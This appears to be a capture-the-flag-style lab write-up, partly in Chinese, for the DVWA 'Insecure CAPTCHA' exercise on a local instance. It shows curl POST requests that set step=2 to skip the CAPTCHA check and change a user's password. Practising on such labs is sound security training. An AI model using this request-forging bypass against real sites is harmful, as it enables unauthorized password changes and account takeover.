# Insecure CAPTCHA

### Objective: Your aim, change the current user's password in an automated manner because of the poor CAPTCHA system.

### 跳過驗證，直接送 POST
先觀察正常流程
```
http://localhost:8086/vulnerabilities/captcha/#
```
Form data:
```
step: "1",
password_new: "222",
password_conf: "111",
Change: "Change"
```

再觀察看看表單送出的內容，有個 `step` key (要記得保持 javascript 關閉的狀態，才能觀察到 POST request，方便接下來修改 request)

```
step=2&password_new=222&password_conf=222&Change=Change
```

簡化版 request
```
curl 'http://dvwa.localtest:8086/vulnerabilities/captcha/#' -X POST

-H 'Content-Type: application/x-www-form-urlencoded' 

-H 'Cookie: PHPSESSID=ov64qqshkod7693old2kdk59e3; security=low' 

--data-raw  'step=2&password_new=222&password_conf=222&Change=Change'
```

完整版 request (這段是利用 Firefox 的 Copy Request as cURL 的功能複製的)
```
curl 'http://dvwa.localtest:8086/vulnerabilities/captcha/#' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: zh-TW,zh;q=0.8,en;q=0.5,en-US;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://dvwa.localtest:8086/vulnerabilities/captcha/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://dvwa.localtest:8086' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=ov64qqshkod7693old2kdk59e3; security=low' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'step=2&password_new=222&password_conf=222&Change=Change'
```

送出 request 後，重新登入驗證密碼有被更改就成功了
